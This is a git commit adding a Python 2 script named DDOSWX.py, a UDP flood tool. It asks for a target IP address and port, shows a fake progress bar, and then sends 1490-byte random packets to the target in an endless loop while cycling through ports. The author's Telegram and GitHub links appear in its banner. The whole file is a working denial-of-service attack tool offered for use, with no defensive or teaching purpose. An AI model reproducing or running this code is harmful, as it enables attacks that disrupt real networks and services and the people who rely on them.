0871b332b012f137c457e93f6cb76cb8dafe3642
Wxsad <93474444+WIROUX@users.noreply.github.com>
2022-01-08 01:47:57 +0330

    DDOSWX
    go to use

---
+++ DDOSWX.py
@@ -0,0 +1,49 @@
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+os.system("clear")
+os.system("figlet DDos WX")
+print
+print "macker   : WX"
+print "telegram : https://t.me/Sad_Wx_virus"
+print "github   : https://github.com/WIROUX"
+print
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
+
+os.system("clear")
+os.system("figlet ddos WX")
+os.system("figlet Attack WX")
+print "[--------------------] 0% "
+time.sleep(5)
+print "[>>>>>---------------] 25%"
+time.sleep(5)
+print "[>>>>>>>>>>----------] 50%"
+time.sleep(5)
+print "[>>>>>>>>>>>>>>>-----] 75%"
+time.sleep(5)
+print "[>>>>>>>>>>>>>>>>>>>>] 100%"
+print "GO GO GO"
+time.sleep(3)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
